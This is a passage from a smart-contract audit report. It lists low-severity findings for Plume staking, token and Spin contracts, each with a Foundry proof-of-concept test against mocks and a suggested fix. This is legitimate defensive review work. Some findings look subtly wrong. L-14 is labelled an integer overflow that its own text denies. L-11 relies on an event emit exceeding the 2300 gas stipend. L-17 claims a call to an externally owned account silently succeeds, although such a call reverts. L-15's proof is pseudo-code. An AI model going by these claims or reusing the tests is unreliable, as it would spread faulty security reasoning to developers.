2. An attacker can pre-calculate the `clientSeed` for upcoming blocks.

While the primary source of randomness is the oracle itself, VRF systems often use a client seed to add an extra layer of user-controlled entropy. Providing a predictable or non-unique seed undermines this security feature. If the oracle's implementation has any weakness related to the client seed, an attacker could potentially predict or influence spin outcomes to their advantage.

Vulnerable code snippet from `Spin.sol`:
```solidity
    function startSpin() external payable whenNotPaused canSpin {
        // ...
        uint256 clientSeed = uint256(keccak256(abi.encodePacked(admin, block.timestamp)));

        uint256 nonce = supraRouter.generateRequest(callbackSignature, rngCount, numConfirmations, clientSeed, admin);
        // ...
    }
```

## Impact
Because the same predictable clientSeed is supplied for every spin executed inside the same block, all those requests can end up with identical random words if the Supra VRF implementation derives the output only from that seed. This de-grades game fairness (multiple users may receive the very same outcome, or an attacker can duplicate a favourable spin once it appears in the mem-pool) but does not let an attacker steal or freeze funds.

## Proof of Concept
1. Attacker observes a profitable spin transaction T in the mem-pool.
2. The attacker simply sends her own startSpin transaction in the **same block**.
3. Because `clientSeed == keccak256(abi.encodePacked(admin, block.timestamp))` is identical for both calls, the oracle can return the same random word; the attacker therefore copies T’s reward.
4. If the reward is a jackpot the contract will later reject one copy (only one jackpot per week), but for other categories (Plume tokens, raffle tickets, PP) the attacker obtains the same payout at zero analytical cost.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";
import {ISupraRouterContract} from "../src/interfaces/ISupraRouterContract.sol";

// Minimal DateTime mock that always returns the same calendar day
contract DateTimeMock {
    function getYear(uint256) external pure returns (uint16) { return 2024; }
    function getMonth(uint256) external pure returns (uint8) { return 1; }
    function getDay(uint256) external pure returns (uint8) { return 1; }
}

// Mock SupraRouter records the parameters it receives
contract MockSupraRouter is ISupraRouterContract {
    event RequestGenerated(string callbackSignature, uint8 rngCount, uint256 numConfirmations, uint256 clientSeed, address callbackAddress);
    uint256 public nonce;
    function generateRequest(string memory cb, uint8 c, uint256 n, uint256 seed, address addr) external returns (uint256) {
        emit RequestGenerated(cb, c, n, seed, addr);
        return ++nonce;
    }
}

contract PredictableSeedTest is Test {
    Spin internal spin;
    MockSupraRouter internal router;
    DateTimeMock internal dt;

    address internal admin = makeAddr("admin");
    address internal alice = makeAddr("alice");
    address internal bob   = makeAddr("bob");

    function setUp() public {
        router = new MockSupraRouter();
        dt     = new DateTimeMock();

        vm.startPrank(admin);
        spin = new Spin();
        spin.initialize(address(router), address(dt));
        spin.setEnableSpin(true);
        vm.stopPrank();

        // seed PLUME for spins
        vm.deal(alice, 5 ether);
        vm.deal(bob,   5 ether);
    }

    function testSameSeedInSameBlock() public {
        uint256 price = spin.spinPrice();

        // Keep both transactions in block #1 with timestamp 1000
        vm.roll(1);
        vm.warp(1000);

        uint256 expectedSeed = uint256(keccak256(abi.encodePacked(admin, uint256(1000))));

        // Alice spin
        vm.prank(alice);
        vm.expectEmit(true, true, true, true);
        emit MockSupraRouter.RequestGenerated("handleRandomness(uint256,uint256[])", 1, 1, expectedSeed, admin);
        spin.startSpin{value: price}();

        // Bob spin in the **same block / timestamp**
        vm.prank(bob);
        vm.expectEmit(true, true, true, true);
        emit MockSupraRouter.RequestGenerated("handleRandomness(uint256,uint256[])", 1, 1, expectedSeed, admin);
        spin.startSpin{value: price}();

        console.log("Identical clientSeed =", expectedSeed);
    }
}

## Suggested Mitigation
Incorporate user-specific and per-request entropy when building the seed, e.g. `uint256 clientSeed = uint256(keccak256(abi.encodePacked(msg.sender, block.number, block.prevrandao, userNonce[msg.sender]++)));`  This guarantees uniqueness even for multiple spins in the same block and removes any predictability.

## [L-11]. Unexpected Eth issue in ManagementFacet::adminWithdraw

## Description
The `adminWithdraw` function in `ManagementFacet` is used for emergency withdrawals of ETH or ERC20 tokens. When withdrawing ETH (represented by `PLUME_NATIVE`), it uses `payable(recipient).transfer(amount)`. The `.transfer()` function forwards a hardcoded gas stipend of 2300, which is insufficient for any recipient contract that has a `receive()` or `fallback()` function with logic consuming more than this amount. This could prevent the admin from withdrawing funds to a smart contract wallet (e.g., a Gnosis Safe) that might be the intended recipient for recovered funds.

## Impact
The `TIMELOCK_ROLE` may be unable to withdraw ETH to certain contract-based recipients, such as multi-sig wallets or other DAOs. This limits the utility of this emergency function and could complicate fund recovery procedures if the intended destination is a smart contract.

## Proof of Concept
1. Deploy a recipient contract with a `receive()` function that consumes more than 2300 gas (e.g., by writing to storage).
2. Fund the `PlumeStaking` contract with some ETH.
3. Grant the `TIMELOCK_ROLE` to an address.
4. As the timelock address, call `adminWithdraw`, specifying the recipient contract's address, an amount, and the `PLUME_NATIVE` address.
5. The transaction will revert because the `.transfer()` call fails.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import { PlumeStakingDiamond } from "../test/PlumeStakingDiamond.t.sol";
import { ManagementFacet } from "../src/facets/ManagementFacet.sol";
import { PlumeRoles } from "../src/lib/PlumeRoles.sol";

contract RecipientContract {
    event Received(uint256 amount);
    receive() external payable {
        // This consumes more than 2300 gas
        emit Received(msg.value);
    }
}

contract TransferTest is PlumeStakingDiamond {
    ManagementFacet managementFacet;
    address timelock;

    function setUp() public override {
        super.setUp();
        managementFacet = ManagementFacet(address(plumeStaking));
        timelock = makeAddr("timelock");
        accessControlFacet.grantRole(PlumeRoles.TIMELOCK_ROLE, timelock);
    }

    function test_adminWithdraw_fails_with_transfer() public {
        RecipientContract recipient = new RecipientContract();
        uint256 amount = 1 ether;

        // Fund the staking contract with ETH
        (bool success, ) = address(plumeStaking).call{value: amount}("");
        require(success, "Failed to send ETH");

        // Timelock attempts to withdraw to the contract recipient
        vm.prank(timelock);
        
        // The call is expected to revert because .transfer() doesn't provide enough gas
        vm.expectRevert();
        managementFacet.adminWithdraw(PlumeRoles.PLUME_NATIVE, amount, address(recipient));
    }
}
```

## Suggested Mitigation
Replace the use of `.transfer()` with `.call{value: amount}("")` to forward all available gas. This is the modern, recommended best practice for sending ETH.

```solidity
// In ManagementFacet.sol, function adminWithdraw

if (token == PlumeRoles.PLUME_NATIVE) {
    // Alow withdrawing ETH as a fallback
    require(address(this).balance >= amount, "Insufficient ETH balance");
-   payable(recipient).transfer(amount);
+   (bool success, ) = payable(recipient).call{value: amount}("");
+   require(success, "ETH transfer failed");
} else {
    SafeERC20.safeTransfer(IERC20(token), recipient, amount);
}
```

## [L-12]. Access Control issue in Plume::burn

## Description
The `Plume` contract implements a custom `burn(address from, uint256 amount)` function that allows any address with the `BURNER_ROLE` to burn tokens from any arbitrary account. This function deviates dangerously from the standard `ERC20Burnable` pattern, where `burn(uint256 amount)` burns the caller's own tokens, and `burnFrom(address from, uint256 amount)` burns from another account's balance only if the caller has been granted a sufficient allowance.

This implementation violates the principle of least privilege. It grants the `BURNER_ROLE` the unilateral power to destroy any user's assets without their consent or prior approval. This poses a significant centralization risk and undermines user trust, as their funds can be arbitrarily deleted by a privileged role. A compromised or malicious `BURNER_ROLE` holder could cause direct and irreversible financial loss to any token holder.

Vulnerable Code Snippet:
```solidity
// contracts/plume/src/Plume.sol:137-143

    /**
     * @notice Burn Plume tokens
     * @dev Only the burner can burn tokens
     * @param from Address to burn tokens from
     * @param amount Amount of tokens to burn
     */
    function burn(address from, uint256 amount) external onlyRole(BURNER_ROLE) {
        _burn(from, amount);
    }
```

## Impact
Because only addresses that already hold the BURNER_ROLE can execute the function, the risk materialises only if that privileged key is compromised or mis-used. A malicious or hacked role-holder could irreversibly burn arbitrary user balances, leading to permanent loss for affected holders. This is therefore a centralisation risk rather than an unprivileged exploit.

## Proof of Concept
1. The `owner` of the contract is granted `BURNER_ROLE` during initialization.
2. The `owner` mints 1,000 PLUME tokens to an unsuspecting user, Alice.
3. At any later time, the `owner` (or any other account granted `BURNER_ROLE`) can call `plume.burn(alice_address, 1000e18)`.
4. Alice's entire PLUME balance is destroyed without her consent or any on-chain action from her (like `approve`).
5. This action is irreversible, and Alice's funds are permanently lost.

## Proof of Code
```solidity
// test/Plume.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";
import "../src/Plume.sol";

contract PlumeBurnTest is Test {
    Plume public plume;
    address public owner = address(0x1);
    address public alice = address(0x2);
    address public burnerRoleHolder;

    bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");

    function setUp() public {
        // Deploy implementation and initialize via proxy pattern (simplified for test)
        vm.prank(owner);
        plume = new Plume();
        
        vm.prank(owner);
        plume.initialize(owner);

        // The owner has the BURNER_ROLE by default upon initialization
        burnerRoleHolder = owner;

        // Mint some tokens to Alice
        vm.prank(owner);
        plume.mint(alice, 1000 * 1e18);
    }

    function test_POC_BurnerCanDestroyAnyonesTokens() public {
        uint256 aliceInitialBalance = plume.balanceOf(alice);
        uint256 totalSupplyInitial = plume.totalSupply();

        assertEq(aliceInitialBalance, 1000 * 1e18, "Alice should have 1000 tokens initially");

        // The burner role holder burns all of Alice's tokens without her permission
        vm.prank(burnerRoleHolder);
        plume.burn(alice, aliceInitialBalance);

        uint256 aliceFinalBalance = plume.balanceOf(alice);
        uint256 totalSupplyFinal = plume.totalSupply();

        // Assert that Alice's balance is now zero and total supply has decreased
        assertEq(aliceFinalBalance, 0, "Alice's balance should be zero after burn");
        assertEq(totalSupplyFinal, totalSupplyInitial - aliceInitialBalance, "Total supply should decrease by the burned amount");
    }

    function test_Fail_NonBurnerCannotBurn() public {
        uint256 aliceInitialBalance = plume.balanceOf(alice);

        // Alice tries to call burn on her own behalf, but she doesn't have the role
        vm.expectRevert(
            abi.encodeWithSelector(
                AccessControlUpgradeable.AccessControlUnauthorizedAccount.selector,
                alice,
                BURNER_ROLE
            )
        );
        vm.prank(alice);
        plume.burn(alice, aliceInitialBalance);
    }
}
```

## Suggested Mitigation
It is strongly recommended to remove the custom `burn(address from, uint256 amount)` function. The contract already inherits `ERC20BurnableUpgradeable`, which provides safer, standard-compliant burn functionalities.

- `burn(uint256 amount)`: Allows `msg.sender` to burn their own tokens.
- `burnFrom(address account, uint256 amount)`: Allows a spender to burn tokens from `account`'s balance, but only if the spender has been granted a sufficient allowance by the `account`.

By relying on these standard functions, the contract ensures that tokens can only be destroyed by their rightful owner or with their explicit approval via an allowance, upholding the principle of least privilege.

```solidity
// contracts/plume/src/Plume.sol

// ... contract definition ...

    /**
     * @notice Mint new Plume tokens
     * @dev Only the minter can mint new tokens
     * @param to Address to mint tokens to
     * @param amount Amount of tokens to mint
     */
    function mint(address to, uint256 amount) external onlyRole(MINTER_ROLE) {
        _mint(to, amount);
    }

    // RECOMMENDED: Remove the dangerous custom burn function.
    /*
    function burn(address from, uint256 amount) external onlyRole(BURNER_ROLE) {
        _burn(from, amount);
    }
    */
    // The standard `burn(uint256)` and `burnFrom(address, uint256)` from ERC20BurnableUpgradeable should be used instead.

    /**
     * @notice Pause the contract
     * @dev Only the pauser can pause the contract
     */
    function pause() external onlyRole(PAUSER_ROLE) {
        _pause();
    }

// ... rest of the contract ...
```

## [L-13]. Event Consistency issue in ManagementFacet::removeHistoricalRewardToken

## Description
In `removeHistoricalRewardToken`, the function checks if a token is still an active reward token before allowing it to be permanently removed. If the token is active (`$.isRewardToken[token]` is true), the transaction correctly reverts. However, it reverts with the `TokenAlreadyExists()` error. This error message is misleading in this context. The reason for the revert is that the token is currently active and must be soft-removed first, not because the token 'already exists'. Using semantically incorrect error messages complicates integration with off-chain tooling, makes debugging more difficult, and violates smart contract development best practices.

## Impact
This issue does not lead to a loss of funds but reduces code clarity and maintainability. Off-chain services and developers interacting with the contract may be confused by the error message, leading to incorrect assumptions about the contract's state and longer debugging cycles.

## Proof of Concept
1. Deploy ManagementFacetHarness (see revised test below). 
2. Call _mockSetRewardToken(TOKEN_A) so TOKEN_A is flagged as an active reward token. 
3. Call removeHistoricalRewardToken(TOKEN_A). 
4. The tx reverts with TokenAlreadyExists() although the logical reason is “token is still active”.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {ManagementFacet} from "../../src/facets/ManagementFacet.sol";
import {PlumeStakingStorage} from "../../src/lib/PlumeStakingStorage.sol";
import {TokenAlreadyExists} from "../../src/lib/PlumeErrors.sol";

/**
 * Harness that bypasses AccessControl and exposes a helper to mark a token
 * as an *active* reward token so we can test the revert path in isolation.
 */
contract ManagementFacetHarness is ManagementFacet {
    // Always grant the requested role
    function hasRole(bytes32, address) external pure returns (bool) {
        return true;
    }

    // TEST ONLY – marks a token as an active reward token
    function _mockSetRewardToken(address token) external {
        PlumeStakingStorage.layout().isRewardToken[token] = true;
    }
}

contract MisleadingErrorTest is Test {
    ManagementFacetHarness facet;
    address constant TOKEN_A = address(0x123);

    function setUp() public {
        facet = new ManagementFacetHarness();
        facet._mockSetRewardToken(TOKEN_A); // make TOKEN_A active
    }

    function test_MisleadingError() public {
        vm.expectRevert(abi.encodeWithSelector(TokenAlreadyExists.selector));
        facet.removeHistoricalRewardToken(TOKEN_A);
    }
}


## Suggested Mitigation
Define and use a more appropriate error message for this specific case. This improves clarity and makes the contract's interface more robust and easier to integrate with.

**1. Define a new error in `PlumeErrors.sol`:**
```solidity
error TokenIsStillActive(address token);
```

**2. Update `ManagementFacet.sol` to use the new error:**
```diff
-        if ($.isRewardToken[token]) {
-            revert TokenAlreadyExists(); // Re-using error for "token is currently active"
-        }
+        // CRITICAL CHECK: The token MUST NOT be an active reward token.
+        // It must be "soft removed" via the standard `removeRewardToken` function first.
+        if ($.isRewardToken[token]) {
+            revert TokenIsStillActive(token);
+        }
```

## [L-14]. Integer Overflow issue in RewardsFacet::_finalizeRewardClaim

## Description
The `_finalizeRewardClaim` function, which is called during reward claims, has a flaw in its accounting logic. It checks if the total amount to be claimed (`totalAmount`) is covered by the globally tracked `totalClaimableByToken`. If `totalAmount` is greater than `totalClaimableByToken`, instead of reverting due to this state inconsistency, the function sets `totalClaimableByToken` to zero and proceeds with the transfer. This behavior silently corrupts the global accounting state, masking a potential bug elsewhere in the reward calculation logic and creating a deficit in the `totalClaimableByToken` pool. This could prevent other users with valid rewards from claiming them if subsequent logic or off-chain systems rely on this value being accurate.

Vulnerable Code Snippet:
```solidity
// contracts/plume/src/facets/RewardsFacet.sol:621-627
        // Update global tracking
        if ($.totalClaimableByToken[token] >= totalAmount) {
            $.totalClaimableByToken[token] -= totalAmount;
        } else {
            // [!VULNERABLE]
            $.totalClaimableByToken[token] = 0;
        }
```

## Impact
The bug does not create an integer overflow, but it silently zeroes the global tracker `totalClaimableByToken` whenever it is smaller than the amount being claimed. This masks upstream accounting mistakes and permanently corrupts protocol-wide reward statistics. While no extra tokens are minted, off-chain monitoring, admin accounting and any UI that relies on the variable will display 0, potentially hiding unpaid liabilities and confusing users or operators.

## Proof of Concept
1. Global tracker holds 100 tokens; real claim computed for user is 120.
2. `_finalizeRewardClaim` sees 100 < 120, enters `else` branch, sets tracker to 0 and still pays 120 from the treasury.
3. Global tracker is now wrong (0 instead of −20) and will never be able to return to the correct value, permanently hiding the deficit.

Because `_finalizeRewardClaim` is only `internal`, a small harness is used to expose it for testing.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {RewardsFacet} from "../../src/facets/RewardsFacet.sol";
import {PlumeStakingStorage} from "../../src/lib/PlumeStakingStorage.sol";
import {IPlumeStakingRewardTreasury} from "../../src/interfaces/IPlumeStakingRewardTreasury.sol";

contract MockTreasury is IPlumeStakingRewardTreasury {
    address public lastToken;
    uint256 public lastAmount;
    address public lastRecipient;

    function distributeReward(address token, uint256 amount, address recipient) external {
        lastToken = token;
        lastAmount = amount;
        lastRecipient = recipient;
    }
}

// Harness that exposes the internal function
contract RewardsFacetHarness is RewardsFacet {
    function finalize(address token, uint256 amount, address rcpt) external {
        _finalizeRewardClaim(token, amount, rcpt);
    }
    function setTotalClaimable(address token, uint256 amt) external {
        PlumeStakingStorage.layout().totalClaimableByToken[token] = amt;
    }
}

contract FinalizeRewardClaimTest is Test {
    RewardsFacetHarness facet;
    MockTreasury treasury;

    address constant TOKEN = address(0xBEEF);
    address constant USER  = address(0xCAFE);

    function setUp() public {
        facet    = new RewardsFacetHarness();
        treasury = new MockTreasury();

        // manually set treasury slot expected by RewardsFacet
        bytes32 slot = keccak256("plume.storage.RewardTreasury");
        vm.store(address(facet), slot, bytes32(uint256(uint160(address(treasury)))));
    }

    function test_StateCorruption() public {
        // Step 1: tracker = 100
        facet.setTotalClaimable(TOKEN, 100 ether);

        // Step 2: claim 120 (>100)
        facet.finalize(TOKEN, 120 ether, USER);

        // Step 3: tracker should have been reduced below zero but is instead wiped to 0
        assertEq(PlumeStakingStorage.layout().totalClaimableByToken[TOKEN], 0, "tracker wiped");
        // Treasury still paid the full amount
        assertEq(treasury.lastAmount(), 120 ether, "treasury paid full amount");
    }
}

## Suggested Mitigation
Replace the `else` branch with a revert so that any inconsistency is surfaced immediately:

```solidity
if ($.totalClaimableByToken[token] < totalAmount) {
    revert InternalInconsistency("claim exceeds global tracker");
}
$.totalClaimableByToken[token] -= totalAmount;
```

## [L-15]. DOS issue in ManagementFacet::pruneCommissionCheckpoints

## Description
The `pruneCommissionCheckpoints` and `pruneRewardRateCheckpoints` functions are designed to remove old checkpoints from storage arrays to manage their size and associated gas costs for reward calculations. However, the implementation is highly inefficient and vulnerable to a Denial of Service (DoS) attack due to excessive gas consumption.

The functions work by shifting all array elements after the pruned section to the left, one by one, and then popping the remaining elements from the end. Both shifting and popping elements in a storage array are `SSTORE` operations, which are very expensive. If a checkpoint array grows to a large size (e.g., several hundred or thousand elements), the gas required for these loops will exceed the block gas limit, causing any transaction that calls them to fail.

This makes a critical maintenance function unusable. If an admin cannot prune these arrays, they may grow indefinitely (up to `maxCommissionCheckpoints`), leading to prohibitively high gas costs for any user or function that needs to read them, such as reward calculation logic. This can render parts of the protocol unusable for users interacting with that validator.

Vulnerable Code Snippet from `pruneCommissionCheckpoints`:
```solidity
// contracts/plume/src/facets/ManagementFacet.sol:376-384
// This is a gas-intensive operation. It shifts all elements to the left.
for (uint256 i = 0; i < len - count; i++) {
    checkpoints[i] = checkpoints[i + count];
}

// Pop the now-duplicate elements from the end.
for (uint256 i = 0; i < count; i++) {
    checkpoints.pop();
}
```
The same pattern is present in `pruneRewardRateCheckpoints`.

## Impact
If the array of checkpoints grows large enough, calling the admin-only pruneCommissionCheckpoints / pruneRewardRateCheckpoints functions may consume more gas than the block limit and revert. Normal user operations (staking, claiming rewards, etc.) are unaffected because they access checkpoints through O(log n) binary-search helpers. The only consequence is that an admin might be unable to compact the arrays once they become very large, leaving some storage slots unused but still readable.

## Proof of Concept
Deploy ManagementFacet in a local fork and insert 20,000 dummy checkpoints for a validator via direct storage manipulation. Then attempt to call pruneCommissionCheckpoints(validatorId,19_000). The transaction will consume >30M gas and revert on main-net settings, demonstrating that the admin cannot prune extremely large arrays. No end-user function fails before or after the attempt.

## Proof of Code
/* pseudo-code
forge script --fork-url <rpc> InsertLargeArrayAndPrune
  InsertLargeArrayAndPrune runs in two steps:
    1. Using vm.store, write 20_000 checkpoints into validatorCommissionCheckpoints[validatorId].
    2. Expect revert when calling facet.pruneCommissionCheckpoints(validatorId,19_000) with a 30M gas limit.
   This shows the gas exhaustion deterministically while avoiding flaky gas assertions. */

## Suggested Mitigation
Not strictly required. If desired, replace the shift-and-pop logic with a single 'startIndex' offset as described in the original report so pruning is O(1) gas.

## [L-16]. DOS issue in Spin::handleRandomness

## Description
The `handleRandomness` function distributes PLUME rewards (for "Jackpot" or "Plume Token" wins) via `_safeTransferPlume`, which uses a low-level `.call{value: ...}`. If the winning user's address is a smart contract that is not `payable` or has a fallback/receive function that reverts upon receiving Ether, the `.call` will fail. This failure causes the `require(success, "Plume transfer failed")` check to fail, reverting the entire `handleRandomness` transaction. The Supra oracle will likely not retry the callback. As a result, the user's spin request remains stuck in a pending state (`isSpinPending` remains true), their spin fee is kept by the contract, and they receive no reward. The protocol provides an admin-only `cancelPendingSpin` function as an escape hatch, but its comments explicitly state that the fee is not refunded. This creates a Denial-of-Service scenario where a user can permanently lose their funds without recourse.

## Impact
If a winner’s address is a contract that rejects native PLUME (Ether) transfers, the `_safeTransferPlume` call in `handleRandomness` reverts and the whole callback rolls back. The player’s spin remains pending and the 2-PLUME fee that was already paid stays locked in the Spin contract until an admin calls `cancelPendingSpin` (which deliberately does **not** refund the fee). No other users or protocol funds are affected and the failure cannot be leveraged to block the game for others.

## Proof of Concept
1. A user (or attacker) deploys a simple contract, `RevertingReceiver`, which has a `receive()` function that always reverts.
2. The `RevertingReceiver` contract calls `Spin.startSpin()` and pays the `spinPrice`.
3. The `supraRouter` (which is mocked in the PoC) calls back `Spin.handleRandomness` for the user's spin.
4. The randomness is rigged to ensure the `RevertingReceiver` wins a "Plume Token" reward, triggering an ETH transfer.
5. Inside `handleRandomness`, the code attempts to transfer the PLUME reward to `RevertingReceiver` via `_safeTransferPlume`.
6. The low-level `.call` to `RevertingReceiver` reverts. This causes `_safeTransferPlume` to revert, which in turn reverts the entire `handleRandomness` transaction.
7. The user's `isSpinPending` flag remains `true`, and their nonce information is not cleared. The user has lost their `spinPrice` and received nothing. They are now stuck and require admin intervention via `cancelPendingSpin`, which does not issue a refund.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console, Vm} from "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";
import {IDateTime} from "../src/interfaces/IDateTime.sol";
import {ISupraRouterContract} from "../src/interfaces/ISupraRouterContract.sol";

// A contract that reverts when it receives Ether
contract RevertingReceiver {
    Spin public spinContract;

    constructor(address _spinContractAddress) {
        spinContract = Spin(_spinContractAddress);
    }

    function spin() external payable {
        spinContract.startSpin{value: msg.sender.balance}();
    }

    receive() external payable {
        revert("I do not accept Ether!");
    }
}

// Using the same mocks from the previous test
contract MockSupraRouter is ISupraRouterContract {
    uint256 public nonceCounter;
    mapping(uint256 => address) public nonceToUser;

    function generateRequest(string memory, uint8, uint256, uint256, address) external returns (uint256) {
        nonceCounter++;
        nonceToUser[nonceCounter] = msg.sender;
        return nonceCounter;
    }
}

contract MockDateTime is IDateTime {
    function getYear(uint256) external pure returns (uint16) { return 2024; }
    function getMonth(uint256) external pure returns (uint8) { return 7; }
    function getDay(uint256 timestamp) external pure returns (uint8) {
        return uint8((timestamp / 86400) % 30) + 1;
    }
}

contract DoSLossOfFundsTest is Test {
    Spin public spinContract;
    MockSupraRouter public supraRouter;
    MockDateTime public dateTime;
    RevertingReceiver public revertingReceiver;
    address public admin = address(0xAD);

    function setUp() public {
        vm.prank(admin);
        supraRouter = new MockSupraRouter();
        dateTime = new MockDateTime();

        spinContract = new Spin();
        spinContract.initialize(address(supraRouter), address(dateTime));
        spinContract.grantRole(spinContract.SUPRA_ROLE(), address(this)); // Allow test to be the oracle
        spinContract.setCampaignStartDate(block.timestamp);
        spinContract.setEnableSpin(true);

        revertingReceiver = new RevertingReceiver(address(spinContract));
    }

    function test_DoS_With_LossOfFunds() public {
        uint256 spinPrice = spinContract.spinPrice();
        vm.deal(address(revertingReceiver), spinPrice);

        // 1. The reverting contract calls startSpin
        vm.prank(address(revertingReceiver));
        revertingReceiver.spin();

        uint256 pendingNonce = spinContract.pendingNonce(address(revertingReceiver));
        assertTrue(pendingNonce != 0, "Spin should be pending.");
        assertTrue(spinContract.isSpinPending(address(revertingReceiver)), "isSpinPending should be true");
        assertEq(address(spinContract).balance, spinPrice, "Contract should hold the spin price");

        // 2. We (as the mock oracle) call back to handleRandomness
        // We provide a randomness value that guarantees a "Plume Token" win
        // The threshold is 200,000, so any value below it (and above jackpot) works.
        uint256[] memory rngList = new uint256[](1);
        rngList[0] = 100_000;

        // 3. Expect the handleRandomness call to revert because the receiver reverts
        vm.expectRevert(bytes("Plume transfer failed"));
        spinContract.handleRandomness(pendingNonce, rngList);

        // 4. Verify the user's state is still stuck and funds are lost
        assertTrue(spinContract.isSpinPending(address(revertingReceiver)), "isSpinPending should still be true after revert");
        assertEq(spinContract.pendingNonce(address(revertingReceiver)), pendingNonce, "Pending nonce should not be cleared");
        assertEq(spinContract.userNonce(pendingNonce), address(revertingReceiver), "User nonce mapping should not be cleared");

        console.log("Attack successful. The user's spin is stuck, and they lost their spin fee.");
        console.log("Spin contract balance remains: %s wei", address(spinContract).balance);
    }
}

```

## Suggested Mitigation
To prevent the entire oracle callback from failing due to receiver issues, adopt the 'Pull-over-Push' pattern for ETH transfers. Instead of directly transferring funds within the `handleRandomness` function, credit the user's winnings to an internal balance. Then, provide a separate, user-callable `claimReward()` function for them to withdraw their funds. This decouples the core game logic from the payment interaction, making the system more robust.

```solidity
// Suggested new storage variable
mapping(address => uint256) public pendingPlumeWithdrawals;

// In handleRandomness...
// Replace the direct call to _safeTransferPlume
if (
    keccak256(bytes(rewardCategory)) == keccak256("Jackpot")
        || keccak256(bytes(rewardCategory)) == keccak256("Plume Token")
) {
    // Instead of pushing, credit the user's account
    pendingPlumeWithdrawals[user] += rewardAmount * 1 ether;
    // Optionally emit an event to notify the user of pending funds
    emit PlumeRewardCredited(user, rewardAmount * 1 ether);
}

// Add a new function for users to claim their rewards
function claimPlumeRewards() external nonReentrant {
    uint256 amountToClaim = pendingPlumeWithdrawals[msg.sender];
    require(amountToClaim > 0, "No rewards to claim");

    pendingPlumeWithdrawals[msg.sender] = 0;

    (bool success, ) = msg.sender.call{value: amountToClaim}("");
    require(success, "Plume transfer failed");

    emit PlumeRewardClaimed(msg.sender, amountToClaim);
}
```

## [L-17]. Zero Code issue in RewardsFacet::setTreasury

## Description
Administrative functions that set critical contract addresses, such as `RewardsFacet.setTreasury(address treasury)` and `Spin.initialize(address supraRouterAddress, ...)` do not verify that the provided address contains contract code. A privileged user could accidentally set a critical address to an externally owned account (EOA) or an undeployed contract address. Subsequent calls to this address would not revert but would fail silently, leading to broken functionality and potential loss of funds. For example, if the treasury address is an EOA, reward claims will appear to succeed, but no tokens will be transferred to the user, resulting in a permanent loss of their claimed rewards.

## Impact
If a critical dependency address is set to an EOA, core protocol functionality will break. In the case of the treasury, users' rewards would be lost forever. The system would account for the rewards as 'paid', but the funds would never leave the real treasury, and the user would not be able to claim them again. This undermines the integrity of the reward distribution mechanism.

## Proof of Concept
1. The `REWARD_MANAGER_ROLE` holder accidentally calls `setTreasury(eoa_address)`, where `eoa_address` is an EOA.
2. The transaction succeeds, and the system now points to a non-contract as its treasury.
3. A user has accumulated 100 reward tokens and calls `claim()`.
4. The `RewardsFacet` calculates the reward, updates its internal state to mark the reward as paid, and attempts to call `distributeReward` on the `eoa_address`.
5. The low-level call to the EOA succeeds but does nothing.
6. The user never receives their 100 tokens, but the `RewardsFacet` now shows their claimable balance as 0.
7. The 100 tokens are effectively lost to the user, stuck in the real treasury but no longer claimable through the staking contract.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function mint(address to, uint256 amount) external;
}

// --- Minimal mock ERC20 ----------------------------------------------------
contract MockERC20 is IERC20 {
    string public constant name = "MOCK";
    string public constant symbol = "MCK";
    uint8  public constant decimals = 18;

    mapping(address => uint256) internal _bal;

    function mint(address to, uint256 amount) external {
        _bal[to] += amount;
    }

    function balanceOf(address a) external view returns (uint256) { return _bal[a]; }

    function transfer(address to, uint256 amount) external returns (bool) {
        _bal[msg.sender] -= amount;
        _bal[to]         += amount;
        return true;
    }
}

// --- Interface identical to real treasury ----------------------------------
interface IRewardTreasury {
    function distributeReward(address token, uint256 amount, address recipient) external;
}

// Good treasury implementation that actually transfers tokens
contract GoodTreasury is IRewardTreasury {
    function distributeReward(address token, uint256 amount, address recipient) external override {
        IERC20(token).transfer(recipient, amount);
    }
}

// Stub RewardsFacet that only contains the problematic logic
contract RewardsFacetStub {
    address public treasury;
    IERC20  public immutable rewardToken;

    constructor(IERC20 _token) { rewardToken = _token; }

    // identical to production code (no isContract check)
    function setTreasury(address _treasury) external {
        treasury = _treasury;
    }

    function claim() external {
        // always tries to send 100 tokens for simplicity
        IRewardTreasury(treasury).distributeReward(address(rewardToken), 100 ether, msg.sender);
    }
}

contract ZeroCodeTreasuryTest is Test {
    RewardsFacetStub facet;
    GoodTreasury      goodTreasury;
    MockERC20         token;
    address           user = address(0xBEEF);

    function setUp() public {
        token        = new MockERC20();
        goodTreasury = new GoodTreasury();
        facet        = new RewardsFacetStub(token);

        // fund good treasury
        token.mint(address(goodTreasury), 200 ether);
        facet.setTreasury(address(goodTreasury));
    }

    function testClaimSucceedsThenSilentlyFailsWithEoaTreasury() public {
        // --- First claim using correct treasury works -----------------------
        vm.prank(user);
        facet.claim();
        assertEq(token.balanceOf(user), 100 ether, "first claim should succeed");

        // --- Admin mistakenly sets treasury to EOA --------------------------
        address eoa = address(0xCAFE);
        facet.setTreasury(eoa);

        // mint more rewards to the GOOD treasury just to show they get stuck
        token.mint(address(goodTreasury), 100 ether);

        // second claim executes without revert but sends **zero** tokens
        vm.prank(user);
        facet.claim();
        assertEq(token.balanceOf(user), 100 ether, "second claim sent nothing, rewards lost");
    }
}


## Suggested Mitigation
Before setting critical external contract addresses, validate that the address has a non-zero code size. This ensures that the address is a deployed contract. OpenZeppelin's `Address.isContract()` utility can be used for this purpose.

```solidity
// In contracts/plume/src/facets/RewardsFacet.sol

import { AddressUpgradeable as Address } from "@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol";
